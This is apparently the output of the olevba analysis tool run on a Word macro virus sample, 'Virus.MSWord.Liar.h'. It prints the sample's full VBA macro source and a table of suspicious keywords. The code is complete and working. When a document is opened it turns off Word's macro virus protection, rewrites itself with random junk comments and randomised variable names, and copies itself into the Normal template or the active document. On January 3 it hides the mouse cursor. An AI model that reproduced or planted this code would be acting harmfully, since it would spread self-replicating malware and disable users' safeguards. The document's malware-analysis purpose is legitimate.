olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.h-d42b8d7b8bfe6ef1847b8e43bedcffb753a3148a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.h-d42b8d7b8bfe6ef1847b8e43bedcffb753a3148a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer '
Private Sub Document_Open() '
On Error Resume Next '
Dim Gp58(235): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '
Set Ei10 = MacroContainer.VBProject: Set Mw61 = Ei10.VBComponents(1) '
Set Rs34 = Mw61.CodeModule: Set Le27 = NormalTemplate: Fy88 = Chr(39) '
If MacroContainer = Le27 Then Set Le27 = ActiveDocument '
Set Hx60 = Le27.VBProject.VBComponents(1).CodeModule: Dz75 = Rs34.CountOfLines: Pz27 = 150 + Int(Rnd * 50) '
For Rm50 = 1 To Dz75: Me13 = "": Uo82 = Int(Rnd * 3): Rl47 = InStr(Rs34.Lines(Rm50, 1), Fy88) '
If Rl47 = 1 And Dz75 > Pz27 Then '
Uo82 = 1: GoTo Me23 '
End If '
Mw70 = Left(Rs34.Lines(Rm50, 1), (Rl47 - 1)) '
Gp58(Rm50) = Gp58(Rm50) & Mw70 '
For Ki92 = 1 To Int(75 - Int(Rnd * 20)): Me13 = Me13 & Chr(255 - Int(Rnd * 100)): Next Ki92 '
Gp58(Rm50) = Gp58(Rm50) & Fy88 & Me13 '
If Uo82 = 2 Then Gp58(Rm50) = Gp58(Rm50) & vbCr & Fy88 & Me13 '
Hy57 = Hy57 & Gp58(Rm50) & vbCr '
Me23: '
Next Rm50 '
Dim Sl82(1 To 23) '
Sl82(1) = "Hy57": Sl82(2) = "Sl82": Sl82(3) = "Sk52": Sl82(4) = "Ow43": Sl82(5) = "Pl68": Sl82(6) = "Vx99" '
Sl82(7) = "Gp58": Sl82(8) = "Ei10": Sl82(9) = "Mw61": Sl82(10) = "Rs34": Sl82(11) = "Le27": Sl82(12) = "Fy88" '
Sl82(13) = "Hx60": Sl82(14) = "Dz75": Sl82(15) = "Pz27": Sl82(16) = "Rm50": Sl82(17) = "Me13": Sl82(18) = "Uo82" '
Sl82(19) = "Rl47": Sl82(20) = "Me23": Sl82(21) = "Mw70": Sl82(22) = "Ki92": Sl82(23) = "Hy57" '
For Sk52 = 1 To 23 '
Ow43 = Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22)) & Int(Rnd * 99999) '
Vx99 = 1 '
Pl68: '
Vx99 = InStr(Vx99, Hy57, Sl82(Sk52)) '
If Vx99 <> 0 Then Hy57 = Mid(Hy57, 1, (Vx99 - 1)) & Ow43 & Mid(Hy57, (Vx99 + Len(Sl82(Sk52))), Len(Hy57)): GoTo Pl68 '
Next Sk52 '
If Hx60.CountOfLines < (0 + 2) Then '
Hx60.DeleteLines 1, Hx60.CountOfLines: Hx60.AddFromString Hy57 '
If Le27 = ActiveDocument Then ActiveDocument.SaveAs (ActiveDocument.FullName) '
End If '
If Day(Now()) = 3 And Month(Now()) = 1 Then '
MsgBox "the only way to be free is to start a revolution or to die...", 64, "Class.Angel | -jackie twoflower/Lz0NT/MVT-" '
While ShowCursor(False) >= 0 '
Wend '
End If '
End Sub '
Rem "Thats why I am easy...easy like sunday morning" -jackie twoflower- '
Rem Class.Angel uses PiE in combination with PVP by jackie twoflower '
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |J_6                 |Sl82                                         |
|String    |                    |                                             |
|Base64    |JNv                 |Sk52                                         |
|String    |                    |                                             |
|Base64    |Fnt                 |Rm50                                         |
|String    |                    |                                             |
|Base64    |F^;                 |Rl47                                         |
|String    |                    |                                             |
|Base64    |*/v                 |Ki92                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

